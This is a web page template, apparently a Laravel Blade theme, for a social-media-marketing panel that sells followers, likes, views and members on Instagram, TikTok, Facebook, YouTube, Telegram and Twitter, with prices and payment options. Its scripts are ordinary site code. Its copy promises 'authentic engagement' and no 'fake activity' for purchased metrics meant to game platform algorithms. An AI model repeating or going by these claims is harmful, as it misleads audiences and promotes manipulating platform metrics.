                                            <p><span style="font-size: 16px">As one of the leading platforms worldwide,
                                                    we offer instant delivery, genuine results, and complete
                                                    transparency. Supporting all major networks including Instagram,
                                                    YouTube, TikTok, Facebook, Twitter, Telegram, Snapchat, Kick, and
                                                    more — everything manageable from a single, simple dashboard.</span>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_131">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="text-block-with-image ">
                            <div class="row">
                                <div class="col">
                                    <div class="d-md-flex align-items-start">
                                        <div class="text-block__description">
                                            <h2 class="text-left"><span style="font-size: 20px"><span
                                                        style="text-align: LEFT">Safe, Affordable, and Reliable – Why
                                                        {{ $settings['site_name'] ?? config('app.name') }} is the Smart Choice for Your Brand</span></span></h2>
                                            <p class="text-left">Choosing the right growth partner can significantly
                                                impact your brand. Trust, security, and long-lasting results are our
                                                priority — encrypted payments, verified sources, and authentic
                                                engagement, every time. You won't have to worry about drops or fake
                                                activity — every order is processed with accuracy and consistency.</p>
                                            <p><br></p>
                                            <p class="text-left">Our mission is to make professional marketing simple,
                                                fast, and budget-friendly for everyone. Whether you're just testing the
                                                waters or scaling campaigns for steady long-term performance, we've got
                                                you covered. With worldwide coverage, years of industry experience, and
                                                a team that's always ready to help, we turn visibility into growth and
                                                clicks into loyal audiences.</p>
                                        </div>
                                        <div class="text-block__image">
                                            <img src="https://storage.perfectcdn.com/hx1lyd/ao1wsoeqgelunl7n.png" alt=""
                                                title="" class="img-fluid">
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_296">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="header-with-text ">
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__title">
                                        <h2 class="text-center"><span style="text-align: CENTER">Free Trial</span></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__description">
                                        <p class="text-center"><span style="text-align: CENTER">Try our services for
                                                free and get the chance to test the quality. If you are satisfied, you
                                                can sign up on our panel, add balance, and take advantage of the 10%
                                                bonus offer. Start using our free SMM services today.</span></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_282">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="text-block-2-columns-card ">
                            <div class="grid-ed grid-1"
                                style="--gapSizeX: 30px; --gapSizeY: 30px; --overlapX: 0px; --overlapY: 0px; --rowJustify: flex-start; --rowAlign: stretch;">
                                <div class="row-ed">
                                    <div class="col-ed md:col-ed-span-6 text-block-2-columns-col card component_card_1">
                                        <div class="text-block__description">
                                            <p class="text-left"><a target="_self"
                                                    href="/free-instagram-followers"><span
                                                        style="line-height: 26px"><span style="text-align: LEFT"><span
                                                                style="font-size: 16px">Free Instagram
                                                                Followers</span></span></span></a></p>
                                            <p class="text-left"><a target="_self" href="/free-instagram-likes"><span
                                                        style="line-height: 26px"><span style="text-align: LEFT"><span
                                                                style="font-size: 16px">Free Instagram
                                                                Likes</span></span></span></a></p>
                                            <p class="text-left"><a target="_self" href="/free-instagram-views"><span
                                                        style="line-height: 26px"><span style="text-align: LEFT"><span
                                                                style="font-size: 16px">Free Instagram
                                                                Views</span></span></span></a></p>
                                            <p><br></p>
                                            <p><a target="_self" href="/free-youtube-views"><span
                                                        style="line-height: 26px"><span style="text-align: LEFT"><span
                                                                style="font-size: 16px">Free Youtube
                                                                Views</span></span></span></a></p>
                                            <p><br></p>
                                            <p><a target="_self" href="/free-twitter-followers"><span
                                                        style="line-height: 26px"><span style="text-align: LEFT"><span
                                                                style="font-size: 16px">Free Twitter
                                                                Followers</span></span></span></a></p>
                                            <p><a target="_self" href="/free-twitter-likes"><span
                                                        style="line-height: 26px"><span style="text-align: LEFT"><span
                                                                style="font-size: 16px">Free Twitter
                                                                Likes</span></span></span></a></p>
                                            <p><a target="_self" href="/free-tiktok-views"><span
                                                        style="line-height: 26px"><span style="text-align: LEFT"><span
                                                                style="font-size: 16px">Free Twitter (X)
                                                                Views</span></span></span></a></p>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 text-block-2-columns-col card component_card_2">
                                        <div class="text-block__description">
                                            <p><a target="_self" href="/free-tiktok-followers"><span
                                                        style="line-height: 26px"><span style="font-size: 16px">Free
                                                            TikTok Followers</span></span></a></p>
                                            <p><a target="_self" href="/free-tiktok-likes"><span
                                                        style="line-height: 26px"><span style="font-size: 16px">Free
                                                            TikTok Likes</span></span></a></p>
                                            <p><a target="_self" href="/free-tiktok-views"><span
                                                        style="line-height: 26px"><span style="font-size: 16px">Free
                                                            TikTok Views</span></span></a></p>
                                            <p><br></p>
                                            <p><a target="_self" href="/free-facebook-followers"><span
                                                        style="line-height: 26px"><span style="font-size: 16px">Free
                                                            Facebook Followers</span></span></a></p>
                                            <p><a target="_self" href="/free-facebook-likes"><span
                                                        style="line-height: 26px"><span style="font-size: 16px">Free
                                                            Facebook Likes</span></span></a></p>
                                            <p><a target="_self" href="/free-facebook-views"><span
                                                        style="line-height: 26px"><span style="font-size: 16px">Free
                                                            Facebook Views</span></span></a></p>
                                            <p><br></p>
                                            <p><a target="_blank" href="/free-smm-panel"><span
                                                        style="line-height: 26px"><span style="font-size: 16px">Free Smm
                                                            Panel</span></span></a></p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_294">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="header-with-text ">
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__title">
                                        <h2 class="text-center"><span style="text-align: CENTER">Payment Methods</span>
                                        </h2>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__description">
                                        <p class="text-center">We operate as a PayPal SMM panel, designed to offer a
                                            smooth and reliable checkout experience. You can choose from multiple
                                            payment methods including Wise, Cryptomus, Heleket (crypto), and bank
                                            transfer. This flexibility allows you to complete your orders quickly using
                                            the option that suits you best.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_293">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="features-block-images ">
                            <div class="grid-ed grid-1"
                                style="--gapSizeX: 30px; --gapSizeY: 30px; --overlapX: 0px; --overlapY: 0px; --rowJustify: flex-start; --rowAlign: stretch;">
                                <div class="row-ed">
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                      padding-top: 55px;                                  padding-bottom: 4px;                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="w-100">
                                                    <div class="features-block__header">
                                                        <div class="features-block__header-image"
                                                            style="margin-bottom: 10px;">
                                                            <img src="https://storage.perfectcdn.com/hx1lyd/9rcewod7jdyj4p2o.png"
                                                                alt="Credit Cart" title="Visa Master Card"
                                                                class="img-fluid">
                                                        </div>
                                                    </div>
                                                    <div class="features-block__header-title"
                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                        <p><br></p>
                                                    </div>
                                                    <div class="features-block__body">
                                                        <div class="features-block__body-description"
                                                            style="padding-left: 0px; padding-right: 0px;">
                                                            <p><br></p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                      padding-top: 55px;                                                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="w-100">
                                                    <div class="features-block__header">
                                                        <div class="features-block__header-image"
                                                            style="margin-bottom: 10px;">
                                                            <img src="https://storage.perfectcdn.com/hx1lyd/3wq9x0jhyu4zbaaz.png"
                                                                alt="Crypto Payments" title="Coin Payments"
                                                                class="img-fluid">
                                                        </div>
                                                    </div>
                                                    <div class="features-block__header-title"
                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                        <p><br></p>
                                                    </div>
                                                    <div class="features-block__body">
                                                        <div class="features-block__body-description"
                                                            style="padding-left: 0px; padding-right: 0px;">
                                                            <p><br></p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                      padding-top: 55px;                                                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="w-100">
                                                    <div class="features-block__header">
                                                        <div class="features-block__header-image"
                                                            style="margin-bottom: 10px;">
                                                            <img src="https://storage.perfectcdn.com/hx1lyd/ler8i01cggmie2k4.png"
                                                                alt="korapay payment" title="Korapay Nigerian Payment"
                                                                class="img-fluid">
                                                        </div>
                                                    </div>
                                                    <div class="features-block__header-title"
                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                        <p><br></p>
                                                    </div>
                                                    <div class="features-block__body">
                                                        <div class="features-block__body-description"
                                                            style="padding-left: 0px; padding-right: 0px;">
                                                            <p><br></p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 lg:col-ed-span-3 card"
                                        style="
                                                                                                                                                      padding-top: 55px;                                                                                                                                                                                                                                                                                                                                                                                                                                 ">
                                        <div class="col-ed-elements">
                                            <div class="col-ed-elements--element">
                                                <div class="w-100">
                                                    <div class="features-block__header">
                                                        <div class="features-block__header-image"
                                                            style="margin-bottom: 10px;">
                                                            <img src="https://storage.perfectcdn.com/hx1lyd/49k2kc8ck3eppp45.png"
                                                                alt="PayPal SMM" title="PayPal Smm Panel"
                                                                class="img-fluid">
                                                        </div>
                                                    </div>
                                                    <div class="features-block__header-title"
                                                        style="margin-bottom: 10px; padding-left: 0px; padding-right: 0px;">
                                                        <p><br></p>
                                                    </div>
                                                    <div class="features-block__body">
                                                        <div class="features-block__body-description"
                                                            style="padding-left: 0px; padding-right: 0px;">
                                                            <p><br></p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_283">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="header-with-text ">
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__title">
                                        <h2 class="text-center"><span style="text-align: CENTER">All SMM Panel Services
                                                Insight</span></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-12">
                                    <div class="text-block__description">
                                        <p class="text-center"><span style="text-align: CENTER">You can use {{ $settings['site_name'] ?? config('app.name') }} for
                                                the most affordable and highest quality SMM services tailored to your
                                                needs. You can use the drip-feed option on all follower and engagement
                                                packages. You can also test our services from the free SMM services
                                                section.</span></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_297">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="text-block-2-columns-card ">
                            <div class="grid-ed grid-1"
                                style="--gapSizeX: 30px; --gapSizeY: 30px; --overlapX: 0px; --overlapY: 0px; --rowJustify: flex-start; --rowAlign: stretch;">
                                <div class="row-ed">
                                    <div class="col-ed md:col-ed-span-6 text-block-2-columns-col card component_card_1">
                                        <div class="text-block__description">
                                            <h3>Instagram SMM Panel Services</h3>
                                            <p>Let's be real, Instagram isn't going anywhere. If anything, it's only
                                                getting more competitive. Whether you're running a small business,
                                                trying to build your personal brand, or just tired of shouting into the
                                                void, Instagram is still the place to be. The frustrating part? Growing
                                                organically these days feels like watching paint dry. You post
                                                consistently, you put in the work, and somehow the numbers just don't
                                                move.</p>
                                            <p><br></p>
                                            <p>That's where we come in. As the <strong>best SMM panel for
                                                    Instagram</strong>, we've got everything in one place — followers,
                                                likes, views, comments, Reels, Stories, DMs, IGTV, mentions, and live
                                                video viewers. Our Instagram followers panel covers every angle so you
                                                don't have to figure it out alone. And the best part? The pricing won't
                                                give you a headache.</p>
                                            <p><br></p>
                                            <p><em><strong>Recommended Instagram </strong></em><strong>Services</strong>
                                            </p>
                                            <p><br></p>
                                            <p><em><strong>4722 | Instagram Follower</strong></em><strong>s |
                                                    $0.9</strong></p>
                                            <p><em><strong>4723 | Instagram Likes</strong></em><strong> | $0.24</strong>
                                            </p>
                                            <p><em><strong>4724 | Instagram Video Views </strong></em><strong>|
                                                    $0.001</strong></p>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 text-block-2-columns-col card component_card_2">
                                        <div class="text-block__description">
                                            <h3>TikTok SMM Panel Services</h3>
                                            <p>TikTok genuinely changed everything. Someone posts a random video and
                                                wakes up the next morning with a million views — that's just Tuesday on
                                                TikTok. But here's the part nobody really talks about: great content
                                                alone doesn't cut it anymore. The algorithm doesn't care about effort,
                                                it cares about momentum. If your numbers aren't moving early, TikTok
                                                simply stops pushing your content. It's brutal, honestly.</p>
                                            <p><br></p>
                                            <p>That's exactly why we're here. Our <strong>SMM panel for TikTok</strong>
                                                gives your content the initial push it needs to get the algorithm's
                                                attention. From {{ $settings['site_name'] ?? config('app.name') }} TikTok follower panel to likes, views, comments,
                                                and shares — everything in one place. Once the algorithm starts working
                                                for you instead of against you, there's no looking back.</p>
                                            <p><br></p>
                                            <p><em><strong>Recommended TikTok </strong></em><strong>Services</strong>
                                            </p>
                                            <p><br></p>
                                            <p><em><strong>4720 | TikTok Follower</strong></em><strong>s | $3.1</strong>
                                            </p>
                                            <p><em><strong>4721 | TikTok Likes</strong></em><strong> | $0.29</strong>
                                            </p>
                                            <p><em><strong>4836 | TikTok Video Views </strong></em><strong>|
                                                    $0.008</strong></p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_298">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="text-block-2-columns-card ">
                            <div class="grid-ed grid-1"
                                style="--gapSizeX: 30px; --gapSizeY: 30px; --overlapX: 0px; --overlapY: 0px; --rowJustify: flex-start; --rowAlign: stretch;">
                                <div class="row-ed">
                                    <div class="col-ed md:col-ed-span-6 text-block-2-columns-col card component_card_1">
                                        <div class="text-block__description">
                                            <h3>Facebook SMM Services</h3>
                                            <p>Look, Facebook might not be the 'cool new thing' anymore, but let's be
                                                real — it's still massive. Billions of people scroll through their
                                                Facebook feed every single day, and that means opportunity is everywhere
                                                if you know how to use it. Building a Facebook page is one thing; making
                                                it actually work for your business is a whole different story.</p>
                                            <p><br></p>
                                            <p>You need likes, you need reach, you need people to actually see what
                                                you're posting. That's exactly what the <strong>best Facebook followers
                                                    panel</strong> delivers — page likes, video views, comments, shares,
                                                live streams, and real reach. Whether you're a small business or a
                                                growing agency, we've got every angle covered.</p>
                                            <p><br></p>
                                            <p><em><strong>Recommended Facebook </strong></em><strong>Services</strong>
                                            </p>
                                            <p><br></p>
                                            <p><em><strong>4725 | Facebook Profile/Page Followers</strong></em><strong>
                                                    | $0.25</strong></p>
                                            <p><em><strong>4726 | Facebook Post Likes</strong></em><strong> |
                                                    $0.11</strong></p>
                                            <p><em><strong>4837 | Facebook Video View</strong></em><strong>s |
                                                    $0.1</strong></p>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 text-block-2-columns-col card component_card_2">
                                        <div class="text-block__description">
                                            <h3>Youtube SMM Panel Services</h3>
                                            <p>YouTube is the second-largest search engine in the world, and people are
                                                genuinely building life-changing careers on it every single day. The
                                                dream is real, but so is the grind. Getting your channel off the ground
                                                without any traction is one of the most frustrating experiences a
                                                content creator can go through. You upload, you wait, and… nothing.
                                                Sound familiar?</p>
                                            <p><br></p>
                                            <p>{{ $settings['site_name'] ?? config('app.name') }} is here to change that. Our <strong>YouTube subscribers, views,
                                                    and watch time panel</strong> gives your channel the credibility it
                                                needs to trigger the algorithm and start growing on its own. Once
                                                YouTube notices you, there's no looking back.</p>
                                            <p><br></p>
                                            <p><em><strong>Recommended YouTube </strong></em><strong>Services</strong>
                                            </p>
                                            <p><br></p>
                                            <p><em><strong>4727 | YouTube Subscribers </strong></em><strong>| $5.20
                                                </strong></p>
                                            <p><em><strong>4848 | YouTube Likes</strong></em><strong> | $0.49</strong>
                                            </p>
                                            <p><em><strong>5014 | YouTube Video Views</strong></em><strong> |
                                                    $1.16</strong></p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="block_299">
                    <div class="block-bg"></div>
                    <div class="container">
                        <div class="text-block-2-columns-card ">
                            <div class="grid-ed grid-1"
                                style="--gapSizeX: 30px; --gapSizeY: 30px; --overlapX: 0px; --overlapY: 0px; --rowJustify: flex-start; --rowAlign: stretch;">
                                <div class="row-ed">
                                    <div class="col-ed md:col-ed-span-6 text-block-2-columns-col card component_card_1">
                                        <div class="text-block__description">
                                            <h3>Telegram SMM Panel Services</h3>
                                            <p>Telegram is one of those platforms that people seriously underestimate.
                                                While everyone is busy fighting over Instagram followers and TikTok
                                                views, Telegram has quietly become one of the most powerful
                                                community-building tools on the internet. Brands, crypto projects, news
                                                channels, content creators — they're all flocking to Telegram because
                                                the engagement there is just different. People actually read what you
                                                post.</p>
                                            <p><br></p>
                                            <p>The problem is, building a Telegram channel from scratch is painfully
                                                slow. Nobody joins a channel with 50 members. That's just the harsh
                                                reality. {{ $settings['site_name'] ?? config('app.name') }} helps you break past that barrier. Our <strong>Telegram
                                                    SMM services </strong>cover everything — members, channel views,
                                                post views, reactions, and shares. And with our <strong>SMM panel for
                                                    Telegram subscribers</strong>, your channel looks credible from day
                                                one. Once people see a thriving community, they want to be part of it.
                                                That's just human nature.</p>
                                            <p><br></p>
                                            <p><em><strong>Recommended Telegram </strong></em><strong>Services</strong>
                                            </p>
                                            <p><br></p>
                                            <p><em><strong>4839 | Telegram Members </strong></em><strong>| $0.52
                                                </strong></p>
                                            <p><em><strong>4840 | Telegram Post Views |</strong></em><strong>
                                                    $0.0013</strong></p>
                                            <p><em><strong>4841 | Telegram Reaction Emoji </strong></em><strong>|
                                                    $0.032</strong></p>
                                        </div>
                                    </div>
                                    <div class="col-ed md:col-ed-span-6 text-block-2-columns-col card component_card_2">
                                        <div class="text-block__description">
                                            <h3>Twitter SMM Panel Services</h3>
                                            <p>Twitter — or X, whatever you want to call it — is still one of the most
                                                influential platforms on the internet. Politicians, celebrities,
                                                entrepreneurs, journalists — they all live on Twitter because that's
                                                where conversations actually happen in real time. A single tweet can go
                                                viral and change everything overnight.</p>
                                            <p><br></p>
                                            <p>But here's the thing: nobody pays attention to an account with 200
                                                followers, no matter how good your content is. Credibility on Twitter is
                                                built on numbers, and that's the cold hard truth. Our <strong>Twitter
                                                    followers panel</strong> gives your presence the foundation it needs
                                                to actually be taken seriously. From likes and retweets to views,
                                                comments, and impressions — our <strong>SMM panel for Twitter
                                                </strong>covers everything so your voice can finally be heard above the
                                                noise.</p>
                                            <p><br></p>
                                            <p><em><strong>Recommended Twitter </strong></em><strong>Services</strong>
                                            </p>
                                            <p><br></p>
                                            <p><em><strong>4845 | Twitter Like</strong></em><strong>s | $2.9</strong>
                                            </p>
                                            <p><em><strong>4842 | Twitter Tweet Views </strong></em><strong>|
                                                    $0.004</strong></p>
                                            <p><em><strong>5026 | Twitter Video Views</strong></em><strong> |
                                                    $0.26</strong></p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="wrapper-content__footer">
                <div id="block_86">
                    <div class="block-bg"></div>
                    <div class="container-fluid">
                        <div class="footer ">
                            <div class="component-footer__public-copyright text-center position-relative">
                                <p class="text-center"><span style="text-align: CENTER"><strong
                                            style="font-weight: bold">{{ getDomain() }}</strong></span><span
                                        style="text-align: CENTER"> © Copyright. All Rights Reserved. </span><a
                                        target="_self" href="/privacy-policy"><span
                                            style="text-align: CENTER">Privacy Policy</span></a></p>
                                <p><br></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Notifications wrapper -->
    <div id="notify-wrapper" class="alert alert-success mb-3 hidden" style="display: none;"></div>


    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KQRQ8BJ4" height="0" width="0"
            style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->

    <div class="integration-fixed integration-fixed__bottom-right">


    </div>
    <script type="text/javascript" src="{{ asset('storage.perfectcdn.com/theme-6/js/99gttjw1i1l6jmws.js') }}">
    </script>
    <script type="text/javascript" src="https://storage.perfectcdn.com/global/hecwkrtjf5h4271l.js">
    </script>
    <script type="text/javascript" src="{{ asset('storage.perfectcdn.com/theme-6/js/ap5ifcinp3jk13sr.js') }}">
    </script>
    @if(!empty($settings['google_client_id']))
        <script type="text/javascript" src="https://accounts.google.com/gsi/client" async defer></script>
    @endif
    <script type="text/javascript" src="{{ asset('storage.perfectcdn.com/theme-6/js/f7lw81wrmhzxhpb3.js') }}">
    </script>
    <script type="text/javascript">
        window.modules.layouts = <?php echo json_encode(['theme_id' => 24, 'auth' => 0, 'live' => true, 'csrftoken' => csrf_token()]); ?>;
    </script>
    <script type="text/javascript">
        window.modules.signin = [];   </script>
    <script type="text/javascript">
        window.modules.captcha_config = { "captcha_required": false, "captcha_site_key": "f1dad752-aa66-42ec-9940-206637bae70c", "captcha_type": "h-captcha", "altcha_url": "https:\/\/altcha.mypanel.link\/v1\/challenge?apiKey=key_1jhlt1fhm00b2s721es", "altcha_used": false, "trusted_email_domains": ["gmail.com", "googlemail.com", "outlook.com", "hotmail.com", "live.com", "msn.com", "yahoo.com", "yahoo.co.jp", "ymail.com", "qq.com", "foxmail.com", "icloud.com", "me.com", "mac.com", "naver.com", "yandex.ru", "yandex.com", "yandex.kz", "mail.ru", "inbox.ru", "bk.ru", "list.ru", "163.com", "126.com", "gmx.com", "gmx.de", "gmx.net", "daum.net", "aol.com", "libero.it", "proton.me", "protonmail.com"], "is_editor": true };   </script>
    <script type="text/javascript">
        window.modules.user_app_show_config = [];   </script>
    <script type="text/javascript">
    </script>

    <script type="text/javascript" id=""
        charset="">var ahrefs_analytics_script = document.createElement("script"); ahrefs_analytics_script.async = !0; ahrefs_analytics_script.src = "https://analytics.ahrefs.com/analytics.js"; ahrefs_analytics_script.setAttribute("data-key", "im6pWoRelyQj8GyVrsgUog"); document.getElementsByTagName("head")[0].appendChild(ahrefs_analytics_script);</script>

    <script>
    (function() {
        var lang = localStorage.getItem('data-lang') || 'vi';

        fetch('/lang/' + lang + '.json')
            .then(function(r) { return r.ok ? r.json() : null; })
            .then(function(t) {
                if (!t) return;
                document.querySelectorAll('[data-lang]').forEach(function(el) {
                    var key = el.getAttribute('data-lang');
                    if (t[key] !== undefined) el.textContent = t[key];
                });
                document.querySelectorAll('[data-lang-placeholder]').forEach(function(el) {
                    var key = el.getAttribute('data-lang-placeholder');
                    if (t[key] !== undefined) el.placeholder = t[key];
                });
                // Update title
                var titleKey = document.querySelector('title[data-lang]')?.getAttribute('data-lang');
                if (titleKey && t[titleKey]) {
                    document.title = t[titleKey] + ' - ' + document.title.split(' - ').slice(1).join(' - ');
                }
            })
            .catch(function() {});
    })();
    </script>
</body>

</html>
